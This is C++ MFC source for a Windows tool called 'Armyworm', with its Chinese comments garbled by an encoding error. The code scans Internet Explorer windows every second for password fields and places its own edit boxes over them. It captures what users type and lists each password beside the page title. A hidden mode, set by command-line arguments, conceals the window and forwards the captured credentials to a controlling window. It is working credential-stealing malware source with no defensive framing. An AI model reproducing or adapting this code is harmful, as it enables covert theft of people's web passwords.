
// ArmywormDlg.cpp : ʵ���ļ�
// Code By Drizzle.Risk

#include "stdafx.h"
#include "Armyworm.h"
#include "ArmywormDlg.h"
#include "afxdialogex.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif


// ����Ӧ�ó��򡰹��ڡ��˵���� CAboutDlg �Ի���

class CAboutDlg : public CDialogEx
{
public:
	CAboutDlg();

// �Ի�������
	enum { IDD = IDD_ABOUTBOX };

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV ֧��

// ʵ��
protected:
	DECLARE_MESSAGE_MAP()
public:
//	bool IsFindAPassEdit;
};

CAboutDlg::CAboutDlg() : CDialogEx(CAboutDlg::IDD)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
END_MESSAGE_MAP()


// CArmywormDlg �Ի���




CArmywormDlg::CArmywormDlg(CWnd* pParent /*=NULL*/)
	: CDialogEx(CArmywormDlg::IDD, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
	flag = 0;
}

void CArmywormDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_LIST1, m_list);
	DDX_Control(pDX, IDC_TIPS, m_tips);
}

BEGIN_MESSAGE_MAP(CArmywormDlg, CDialogEx)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_BN_CLICKED(IDC_BUTTON3, &CArmywormDlg::OnBnClickedButton3)
	ON_BN_CLICKED(IDC_BUTTON4, &CArmywormDlg::OnBnClickedButton4)
	ON_MESSAGE(WM_SETTEXT, OnMyMessage)
	ON_WM_TIMER()
	ON_WM_ACTIVATE()
END_MESSAGE_MAP()


// CArmywormDlg ��Ϣ�������

BOOL CArmywormDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// ��������...���˵�����ӵ�ϵͳ�˵��С�

	// IDM_ABOUTBOX ������ϵͳ���Χ�ڡ�
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		BOOL bNameValid;
		CString strAboutMenu;
		bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
		ASSERT(bNameValid);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// ���ô˶Ի����ͼ�ꡣ��Ӧ�ó��������ڲ��ǶԻ���ʱ����ܽ��Զ�
	//  ִ�д˲���
	SetIcon(m_hIcon, TRUE);			// ���ô�ͼ��
	SetIcon(m_hIcon, FALSE);		// ����Сͼ��

	InitAllMe();	//��ʼ��ճ��
	flag = 0;
	InitList();
	GetDlgItem(IDC_BUTTON3)->EnableWindow(TRUE);
	GetDlgItem(IDC_BUTTON4)->EnableWindow(FALSE);
	GetDlgItem(IDC_CHECK1)->EnableWindow(TRUE);

	return TRUE;  // ���ǽ��������õ��ؼ������򷵻� TRUE
}

void CArmywormDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialogEx::OnSysCommand(nID, lParam);
	}
}

// �����Ի��������С����ť������Ҫ����Ĵ���
//  �����Ƹ�ͼ�ꡣ����ʹ���ĵ�/��ͼģ�͵� MFC Ӧ�ó���
//  �⽫�ɿ���Զ���ɡ�

void CArmywormDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // ���ڻ��Ƶ��豸������

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// ʹͼ���ڹ����������о���
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// ����ͼ��
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

//���û��϶���С������ʱϵͳ���ô˺���ȡ�ù��
//��ʾ��
HCURSOR CArmywormDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}



int CArmywormDlg::InitList(void)
{
	LONG lStyle; 
	lStyle = GetWindowLong(m_list.m_hWnd, GWL_STYLE);//��ȡ��ǰ����style 
	lStyle &= ~LVS_TYPEMASK; //�����ʾ��ʽλ 
	lStyle |= LVS_REPORT; 
	    SetWindowLong(m_list.m_hWnd, GWL_STYLE, lStyle);
	DWORD dwStyle1 = m_list.GetExtendedStyle();
	dwStyle1 |= LVS_EX_GRIDLINES;
	dwStyle1 |= LVS_EX_FULLROWSELECT;
	m_list.SetExtendedStyle(dwStyle1); 

	lStyle = GetWindowLong(m_list.m_hWnd, GWL_STYLE);
	lStyle &= ~LVS_TYPEMASK;
	lStyle |= LVS_REPORT; 
	    SetWindowLong(m_list.m_hWnd, GWL_STYLE, lStyle);
	dwStyle1 = m_list.GetExtendedStyle();
	dwStyle1 |= LVS_EX_GRIDLINES;
	dwStyle1 |= LVS_EX_FULLROWSELECT;
	m_list.SetExtendedStyle(dwStyle1);

	m_list.InsertColumn(0,"���",LVCFMT_CENTER);
	m_list.InsertColumn(1,"���ھ��",LVCFMT_CENTER);
	m_list.InsertColumn(2,"���ڱ���",LVCFMT_CENTER);
	m_list.InsertColumn(3,"��������",LVCFMT_CENTER);

	m_list.SetColumnWidth(0,40);
	m_list.SetColumnWidth(1,60);
	m_list.SetColumnWidth(2,260);
	m_list.SetColumnWidth(3,220);

	return 0;
}


void CArmywormDlg::OnBnClickedButton3()
{//����ճ�棬�����Զ�̽��ģ��
	//��ʼ��LIST
	this->IsFindAPassEdit = false;
	{
		//��ʼ���ظ�����
		for ( int flag = 0 ; flag < 1024  ; flag++  )
		{
			already_done[ flag ] = NULL;
		}
	}
	if(me!=NULL)
	{//�ȹر��Ѿ����ڵĶԻ���
		this->ClearAllMe();
	}
	m_list.DeleteAllItems();
	flag = 0;
	//��ȡ������һЩ�ؼ�
	GetDlgItem(IDC_BUTTON3)->EnableWindow(FALSE);
	if( this->IsHideUse  )
		GetDlgItem(IDC_BUTTON4)->EnableWindow(FALSE);
	else
		GetDlgItem(IDC_BUTTON4)->EnableWindow(TRUE);
	GetDlgItem(IDC_CHECK1)->EnableWindow(FALSE);
	//tips
	this->m_tips.SetWindowTextA("��ʾ���Ѿ���ʼ�Զ��滻IE�д��ڵ������");
	if( !this->IsHideUse )
	{//����������ص��ã��Ż��õ����checkbox
		if(IsDlgButtonChecked(IDC_CHECK1) == BST_CHECKED)
		{
			this->IsPlaintext = true;
		}
		else if(BST_UNCHECKED == IsDlgButtonChecked(IDC_CHECK1))
		{
			this->IsPlaintext = false;
		}
	}
	//�������д���
	BOOL CALLBACK lpEnumFunc(HWND hwnd, LPARAM lParam);
	::EnumWindows(lpEnumFunc , (LPARAM)this);
	//���Ӽ�ʱ��
	SetTimer(1,1000,NULL);

}
BOOL CALLBACK lpEnumFunc(HWND hwnd, LPARAM lParam)
{
	CArmywormDlg * that = (CArmywormDlg*)lParam;
	CString SearchTitle_tmp = "";	//�����ַ���������Ϊ�գ�ƥ������
	char title_buf[1024]={0};
	::GetWindowText(hwnd , title_buf , 1023);

	CString str = title_buf;
	SearchTitle_tmp.MakeLower();
	str.MakeLower();
	if( -1 != str.Find(SearchTitle_tmp))		//�����������ַ�������ʱ����
	{
		//�����ô����µ����пؼ�
		BOOL CALLBACK EnumPro(HWND hwnd, LPARAM lParam);
		::EnumChildWindows(hwnd , EnumPro , (LPARAM)that);
	}
	return true;
}
bool CArmywormDlg::FindIfAlreadyDone(HWND hwnd)
{
	for ( int flag = 0 ; already_done[ flag ] != NULL &&  flag < 1024  ; flag++  )
	{
		if(  hwnd == already_done[ flag ] )
			return true;
		else if( hwnd == NULL )
			break;
	}
	if( flag < 1023 )
	{//���û���������
		already_done[ flag ] = hwnd;
		return false;
	}
	if( flag >= 1023  )
	{//�������
		return false;
	}
	return false ;
}
BOOL CALLBACK EnumPro(HWND hwnd, LPARAM lParam)
{
	CArmywormDlg * that = (CArmywormDlg*)lParam;

	bool IsPassEdit = false;
	bool IsParentIe = false;	//�Ƿ�����IE
	bool IsATL = false;	//�Ƿ�ΪATL�ؼ���activeX�ؼ���
	HWND parent_tab = NULL;	//IE tab��ǩ�ľ��
	HWND parent = NULL;
	HINSTANCE hInstance = AfxGetInstanceHandle();
	char class_name0[255]={0};
	char class_name[255]={0};

	//��ȡEDIT����ʽ
	LONG lstyle = ::GetWindowLong(hwnd,GWL_STYLE);
	if(lstyle & ES_PASSWORD)
	{
		IsPassEdit = true;
	}
	//��ȡEDIT���Сλ��
	RECT rt = { 0 };
	::GetWindowRect(hwnd, &rt); 

	POINT pt = { rt.left, rt.top };
	long lWidth = rt.right - rt.left;	//EDIT���
	long lHeight = rt.bottom - rt.top;	//EDIT�߶�

	//��ȡ�ؼ�����
	GetClassName(hwnd , class_name0 , 254);
	CString tmp = class_name0;
	int find_code = tmp.Find("ATL:");
	if( find_code == 0 ) 
	{//���ATL:�Ӵ�����ʼλ�ã�����Ϊ�˿ؼ�ΪATL�ؼ�
		IsATL = true;
	}
	if(IsPassEdit || IsATL)	
	{//����������ؼ�����ATL�ؼ�
		//�ж��Ƿ��ظ�
		if( that->FindIfAlreadyDone( hwnd ) )
		{//����ظ������Դ���������û�У������
				return true;
		}

		//�ж��Ƿ�Ϊ��������
		HWND hwnd_if_main = hwnd;
		for(int flag = 0 ; flag < 40 ; flag++)
		{
			hwnd_if_main = ::GetParent(hwnd_if_main);
			if(  hwnd_if_main == that->ParamMainHwnd  &&  hwnd_if_main != NULL)
			{//��������������壬�����
				return true;
			}
		}
		//���ȳ����ҵ�IE��TAB��ǩ
		parent = hwnd;
		for(int flag = 0 ; flag < 25 ; flag++)
		{
			parent = ::GetParent(parent);
			memset(class_name, 0,255);
			if(GetClassName(parent , class_name , 254))
			{
				if(strcmp(class_name , "TabWindowClass") == 0)
				{//TabWindowClass
					IsParentIe = true;
					parent_tab = parent;
					break;
				}
			}
		}
		//Ȼ������������жϸÿؼ����ϲ㴰�����Ƿ�ΪIE��������ֱ�ӷ���true
		parent = hwnd;
		for(int flag = 0 ; flag < 25 ; flag++)
		{
			parent = ::GetParent(parent);
			memset(class_name, 0,255);
			if(GetClassName(parent , class_name , 254))
			{//�����ȡ�ɹ�
				if(strcmp(class_name , "Internet Explorer_Server") == 0)
				{//Internet Explorer_Server
					IsParentIe = true;
					break;
				}
				else if(strcmp(class_name , "IEFrame") == 0)
				{//IEFrame
					IsParentIe = true;
					break;
				}
			}
		}

		if(!IsParentIe)
		{//���������IE��ֱ�Ӻ��Ӵ�����򣬼�������Ѱ��
			return true;
		}
		//�������IE�����ڴ˼��������ң��ҵ��������ڣ����һ�ȡ����ͱ�������
		HWND real_parent = NULL;
		if(parent_tab == NULL)
		{//���û���ҵ�TAB��ǩ
			for(int flag = 0 ; flag < 25 ; flag++)
			{
				if( parent != NULL )
				{
					real_parent = parent;
					parent = ::GetParent(parent);
				}
				else
				{//�ҵ��˶�������real_parent
					break ;
				}
			}
		}
		else
		{//�����Ѿ��ҵ���tab��ǩ
			real_parent = parent_tab;
		}
		////��ȡ����,����ʾ
		char title_buf[1024]={0};
		::GetWindowText(real_parent , title_buf , 1023);
		CString str = title_buf;
		str.MakeLower();

		that->IsFindAPassEdit = true;
		//�������������򣬲�������IE��so��ճ�����!
		that->me[that->me_flag] = new MYEDIT ;
		that->me[that->me_flag] ->hwnd = hwnd;
		that->me[that->me_flag] ->parent = real_parent;
		that->me[that->me_flag] ->message_hwnd = that->m_hWnd;
		that->me[that->me_flag] ->num = that->me_flag;	//ճ��ı��
		that->me[that->me_flag]->lwidth = lWidth;	//ճ��Ŀ��
		that->me[that->me_flag]->lheight = lHeight;	//ճ��ĸ߶�
		that->me[that->me_flag] ->Create(IDD_DIALOGEDIT);

		RECT rect;
		::GetWindowRect(that->me[that->me_flag] ->hwnd , &rect);
		//::MoveWindow(that->me[that->me_flag] ->m_hWnd,rect.left,rect.top,rect.right-rect.left,rect.bottom-rect.top,1);
		::MoveWindow(that->me[that->me_flag]->m_hWnd, rect.left, rect.top, lWidth, lHeight, 1);
		if (that->IsPlaintext)
		{//�����������ʾ������ʾ����
			that->me[that->me_flag] ->m_edit.SetPasswordChar(0);
		}
		else
		{
			that->me[that->me_flag] ->m_edit.SetPasswordChar('*');
		}
		that->me[that->me_flag]->m_edit.SetWindowTextA("");	//����������ֵ

		char hwnd_buf[15] = { 0 };
		char num_buf[10] = { 0 };
		itoa(that->flag + 1, num_buf, 10);
		sprintf(hwnd_buf, "%d", that->me[that->me_flag]->m_hWnd);

		that->m_list.InsertItem(that->me_flag, num_buf, NULL);
		that->m_list.SetItemText(that->me_flag, 1, hwnd_buf);
		that->m_list.SetItemText(that->me_flag, 2, title_buf);
		that->flag++;

		that->me[that->me_flag] ->ShowWindow(SW_SHOW);
		that->me[that->me_flag] ->UpdateWindow();
		that->me_flag ++ ;


		if(that->me_flag >= 100)
		{
			return false;
		}
		return true;
	}
	return true;
}


void CArmywormDlg::OnBnClickedButton4()
{
	///�ر�����ճ��
	if(me != NULL)
	{
		this->ClearAllMe();
	}
	GetDlgItem(IDC_BUTTON3)->EnableWindow(TRUE);
	GetDlgItem(IDC_BUTTON4)->EnableWindow(FALSE);
	GetDlgItem(IDC_CHECK1)->EnableWindow(TRUE);
	this->m_tips.SetWindowTextA("");
}


void CArmywormDlg::ClearAllMe(void)
{//��������ճ���
	for( int flag = 0 ; flag < me_flag ;  flag++ )
	{
		me[flag]->CloseWindow();
		me[flag]->DestroyWindow();
		me[flag] = NULL;
	}
	me_flag = 0;
}


void CArmywormDlg::InitAllMe(void)
{//��ʼ������ճ��
	for( int flag = 0 ; flag < 100 ;  flag++ )
	{
		me[flag] = NULL;
	}
	me_flag = 0;
}
LRESULT CArmywormDlg::OnMyMessage(WPARAM wParam, LPARAM lParam)
{
	int num = -1; 
	CString buf = (LPCTSTR)lParam;
	CString buf_num;
	CString buf_pass;
	AfxExtractSubString (buf_num,buf,0,'\r\n');//�õ�ճ����
	AfxExtractSubString (buf_pass,buf,1,'\r\n');//�õ�ճ�浱ǰ����

	num = atoi( buf_num.GetBuffer( buf_num.GetLength() ) );

	this->m_list.SetItemText( num  ,3, buf_pass );

	if(  this->IsHideUse  )
	{//�����﷢����Ϣ��������
		CString buf;
		CString buf_hwnd = this->m_list.GetItemText(num , 1);
		CString buf_title = this->m_list.GetItemText(num , 2);
		CString buf_pass = this->m_list.GetItemText(num , 3);
		buf = "NianChong\r\n";
		buf += buf_hwnd;
		buf += "\r\n";
		buf += buf_title;
		buf += "\r\n";
		buf += buf_pass;

		::SendMessage(this->ParamMainHwnd,WM_SETTEXT,0,(LPARAM)(char *)(buf.GetBuffer(buf.GetLength())));
	}
	return 0;
}


void CArmywormDlg::CheckParam(void)
{
	this->IsHideUse = false;	//Ĭ�ϲ����ص���
	ParamMainHwnd = NULL;
	//���ղ���
	AfxGetApp()->m_lpCmdLine;
	const TCHAR* param_tmp = AfxGetApp()->m_lpCmdLine;
	CString param = param_tmp;
	CString Hwnd_str , IsPassword_str;	//������������һ��Ϊ���ô��ڵľ����16���Ƹ�ʽ�����ڶ�����ʾ�Ƿ����������루password��notpasswoord��
	int errcode = 0;

	//�������Ϊ��
	if(param.IsEmpty())
	{
		this->IsHideUse = false;	//�����ص���
	}
	else
	{
		//�ֱ���ȡRPID��TmpPath
		errcode = AfxExtractSubString(Hwnd_str, param, 0, ' ');
		if(errcode == 0)
		{
			this->IsHideUse = false;	//�����ص���
		}
		errcode = AfxExtractSubString(IsPassword_str, param, 1, ' ');
		if(errcode == 0)
		{
			this->IsHideUse = false;	//�����ص���
		}
	}
	if( this->IsHideUse )
	{
		//����в��������жϲ����Ƿ�Ϸ�
		//�������������ֱ���˳�
		if(Hwnd_str.GetLength() >= 20)
			OnCancel();
		if(IsPassword_str.GetLength() >= 20)
			OnCancel();
		//ת�������������ParamMainHwnd
		int hwnd_int = 0;
		hwnd_int = strtoul(Hwnd_str.GetBuffer(Hwnd_str.GetLength()),0,16);
		this->ParamMainHwnd = (HWND)hwnd_int;
		//��ȡ��ʾ�����״̬
		if(IsPassword_str == "password")
		{//���������ʾ
			this->IsPlaintext  = false;
		}
		else if( IsPassword_str == "notpassword" )
		{//���������ʾ
			this->IsPlaintext  = true;
		}
		else
		{//��������ǣ����˳�
			OnCancel();
		}
	}
}


void CArmywormDlg::OnTimer(UINT_PTR nIDEvent)
{
	//�������д���
	BOOL CALLBACK lpEnumFunc(HWND hwnd, LPARAM lParam);
	::EnumWindows(lpEnumFunc , (LPARAM)this);

	CDialogEx::OnTimer(nIDEvent);
}


void CArmywormDlg::OnActivate(UINT nState, CWnd* pWndOther, BOOL bMinimized)
{
	CDialogEx::OnActivate(nState, pWndOther, bMinimized);
}


LRESULT CArmywormDlg::DefWindowProc(UINT message, WPARAM wParam, LPARAM lParam)
{
	if( message==133 ) 
	{	
		this->CheckParam();	//������
		if( this->IsHideUse )
		{
			ShowWindow(SW_HIDE);
		}
	}
	return CDialogEx::DefWindowProc(message, wParam, lParam);
}